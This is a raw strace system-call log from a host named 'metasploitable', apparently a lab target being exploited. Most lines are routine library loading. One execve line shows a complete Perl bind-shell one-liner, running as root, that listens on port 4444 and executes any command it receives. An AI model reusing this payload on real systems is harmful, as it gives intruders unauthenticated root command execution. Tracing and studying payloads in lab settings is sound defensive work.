5837  07:10:58.072743 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5837  07:10:58.072759 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f6b000
5837  07:10:58.072768 close(1)          = 0
5837  07:10:58.072778 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.072793 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
5837  07:10:58.072807 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5837  07:10:58.072932 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
5837  07:10:58.072967 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dbb000
5837  07:10:58.072993 mmap2(0xb7dc3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dc3000
5837  07:10:58.073010 close(1)          = 0
5837  07:10:58.073023 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5837  07:10:58.073036 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
5837  07:10:58.073050 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5837  07:10:58.073154 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5837  07:10:58.073170 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db0000
5837  07:10:58.073181 mmap2(0xb7db9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7db9000
5837  07:10:58.073197 close(1)          = 0
5837  07:10:58.073217 munmap(0xb7f6b000, 29913) = 0
5837  07:10:58.073233 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
5837  07:10:58.073247 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5837  07:10:58.073258 _llseek(1, 0, [0], SEEK_CUR) = 0
5837  07:10:58.073270 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
5837  07:10:58.073286 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f72000
5837  07:10:58.073297 _llseek(1, 1624, [1624], SEEK_SET) = 0
5837  07:10:58.073311 munmap(0xb7f72000, 1624) = 0
5837  07:10:58.073321 close(1)          = 0
5837  07:10:58.073349 getpgrp()         = 3831
5837  07:10:58.073359 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
5837  07:10:58.073386 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
5837  07:10:58.073430 brk(0x8101000)    = 0x8101000
5837  07:10:58.073477 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5837  07:10:58.073491 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5837  07:10:58.073505 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5837  07:10:58.073542 brk(0x8102000)    = 0x8102000
5837  07:10:58.073568 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5837  07:10:58.073586 stat64("/sbin/AB", 0xbfd50ba8) = -1 ENOENT (No such file or directory)
5837  07:10:58.073598 stat64("/bin/AB", 0xbfd50ba8) = -1 ENOENT (No such file or directory)
5837  07:10:58.073609 stat64("/usr/sbin/AB", 0xbfd50ba8) = -1 ENOENT (No such file or directory)
5837  07:10:58.073621 stat64("/usr/bin/AB", 0xbfd50ba8) = -1 ENOENT (No such file or directory)
5837  07:10:58.073634 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5837  07:10:58.073648 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7de66f8) = 5838
5838  07:10:58.073692 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5838  07:10:58.073708 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5838  07:10:58.073721 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5838  07:10:58.073733 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5838  07:10:58.073748 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5838  07:10:58.073763 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5838  07:10:58.073776 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5838  07:10:58.073829 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
5838  07:10:58.073843 --- SIGPIPE (Broken pipe) @ 0 (0) ---
5838  07:10:58.073959 exit_group(127)   = ?
5837  07:10:58.110554 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:10:58.110628 waitpid(5837,  <unfinished ...>
5837  07:10:58.110648 <... rt_sigprocmask resumed> NULL, 8) = 0
5837  07:10:58.110665 --- SIGCHLD (Child exited) @ 0 (0) ---
5837  07:10:58.110686 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 5838
5837  07:10:58.110713 waitpid(-1, 0xbfd50828, WNOHANG) = -1 ECHILD (No child processes)
5837  07:10:58.110730 sigreturn()       = ? (mask now [])
5837  07:10:58.110753 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5837  07:10:58.110768 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5837  07:10:58.110778 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5837  07:10:58.110791 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5837  07:10:58.110813 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5837  07:10:58.110825 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5837  07:10:58.110863 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5837  07:10:58.110883 stat64("/sbin/perl", 0xbfd50bd8) = -1 ENOENT (No such file or directory)
5837  07:10:58.110895 stat64("/bin/perl", 0xbfd50bd8) = -1 ENOENT (No such file or directory)
5837  07:10:58.110906 stat64("/usr/sbin/perl", 0xbfd50bd8) = -1 ENOENT (No such file or directory)
5837  07:10:58.110918 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5837  07:10:58.110936 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5837  07:10:58.110960 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5837  07:10:58.110974 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7de66f8) = 5839
5839  07:10:58.111033 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5839  07:10:58.111080 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5839  07:10:58.111110 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5839  07:10:58.111139 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5839  07:10:58.111154 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5839  07:10:58.111169 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5839  07:10:58.111181 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5839  07:10:58.111215 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
5839  07:10:58.111299 brk(0)            = 0x8153000
5839  07:10:58.111318 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.111334 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fb1000
5839  07:10:58.111350 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.111367 open("/etc/ld.so.cache", O_RDONLY) = 1
5839  07:10:58.111379 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5839  07:10:58.111395 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fa9000
5839  07:10:58.111406 close(1)          = 0
5839  07:10:58.111416 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.111431 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5839  07:10:58.111445 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5839  07:10:58.111574 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5839  07:10:58.111610 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa5000
5839  07:10:58.111622 mmap2(0xb7fa7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fa7000
5839  07:10:58.111639 close(1)          = 0
5839  07:10:58.111650 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.111668 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
5839  07:10:58.111684 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
5839  07:10:58.111770 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
5839  07:10:58.111786 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f80000
5839  07:10:58.111797 mmap2(0xb7fa3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fa3000
5839  07:10:58.111812 close(1)          = 0
5839  07:10:58.111824 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.111837 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
5839  07:10:58.111851 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
5839  07:10:58.111935 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
5839  07:10:58.111952 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7f000
5839  07:10:58.111964 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f67000
5839  07:10:58.111975 mmap2(0xb7f7b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f7b000
5839  07:10:58.111989 mmap2(0xb7f7d000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f7d000
5839  07:10:58.112002 close(1)          = 0
5839  07:10:58.112024 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.112066 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5839  07:10:58.112096 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5839  07:10:58.112199 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5839  07:10:58.112216 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e18000
5839  07:10:58.112227 mmap2(0xb7f61000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f61000
5839  07:10:58.112242 mmap2(0xb7f64000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
5839  07:10:58.112255 close(1)          = 0
5839  07:10:58.112266 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5839  07:10:58.112279 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
5839  07:10:58.112293 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
5839  07:10:58.112380 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
5839  07:10:58.112396 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de6000
5839  07:10:58.112407 mmap2(0xb7def000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7def000
5839  07:10:58.112421 mmap2(0xb7df1000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7df1000
5839  07:10:58.112435 close(1)          = 0
5839  07:10:58.112458 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de5000
5839  07:10:58.112471 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7de58c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5839  07:10:58.112602 mprotect(0xb7f61000, 4096, PROT_READ) = 0
5839  07:10:58.112646 munmap(0xb7fa9000, 29913) = 0
5839  07:10:58.112659 set_tid_address(0xb7de5908) = 5839
5839  07:10:58.112668 set_robust_list(0xb7de5910, 0xc) = 0
5839  07:10:58.112691 futex(0xbfe61b00, 0x81 /* FUTEX_??? */, 1) = 0
5839  07:10:58.112705 rt_sigaction(SIGRTMIN, {0xb7f6b2c0, [], SA_SIGINFO}, NULL, 8) = 0
5839  07:10:58.112718 rt_sigaction(SIGRT_1, {0xb7f6b340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
5839  07:10:58.112730 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
5839  07:10:58.112743 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
5839  07:10:58.112762 uname({sys="Linux", node="metasploitable", ...}) = 0
5839  07:10:58.112810 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
5839  07:10:58.112855 brk(0)            = 0x8153000
5839  07:10:58.112864 brk(0x8174000)    = 0x8174000
5839  07:10:58.112908 getuid32()        = 0
5839  07:10:58.112918 geteuid32()       = 0
5839  07:10:58.112927 getgid32()        = 0
5839  07:10:58.112935 getegid32()       = 0
5839  07:10:58.112971 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dc4000
5839  07:10:58.112997 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
5839  07:10:58.113025 read(1, "\n\t\37\300", 4) = 4
5839  07:10:58.113069 close(1)          = 0
5839  07:10:58.113104 time(NULL)        = 1495624258
5839  07:10:58.113144 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfe617d0) = -1 ENOENT (No such file or directory)
5839  07:10:58.113161 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfe617d0) = -1 ENOENT (No such file or directory)
5839  07:10:58.113173 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfe617d0) = -1 ENOENT (No such file or directory)
5839  07:10:58.113188 stat64("/usr/local/lib/perl/5.8.7", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113200 stat64("/usr/local/share/perl/5.8.7", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113212 stat64("/usr/local/lib/perl/5.8.6", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113224 stat64("/usr/local/share/perl/5.8.6", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113235 stat64("/usr/local/lib/perl/5.8.4", 0xbfe61910) = -1 ENOENT (No such file or directory)
